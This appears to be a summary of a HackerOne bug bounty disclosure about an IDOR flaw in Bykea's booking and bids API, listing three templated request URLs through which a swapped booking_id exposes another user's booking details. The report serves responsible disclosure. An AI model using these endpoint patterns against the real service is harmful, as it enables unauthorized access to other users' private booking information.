# Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure

**Target**: Bykea

**Reported on**: hackerone

**Bug Type**: IDOR

**Severity**: High

**Report URL**: https://hackerone.com/reports/2374730

## Summary
A researcher found a vulnerable parameter in bykea api - booking_id. The three distincive urls are:<br><br>
```
1. GET https://api.bykea.net/api/v1/bookings/{{booking_id}}?_id={{user_id2}}&token_id={{access_token2}}
2. GET https://api.bykea.net/api/v2/bids/{{booking_id}}?_id={{user_id2}}&token_id={{access_token2}}
3. GET https://boleelagao.bykea.net/v1/config?lat={{latitute}}&lng={{longitude}}&service_code=23&trip_id={{booking_id}}
```<br><br>

An attacker who has hold of the booking_id could easily use it to get booking information of another user.

## Bounty received ($)
Unspecified

## References
- https://hackerone.com/reports/2374730
## Tags
- IDOR
- Information-Disclosure
- sensitive-data
- broken-access-control
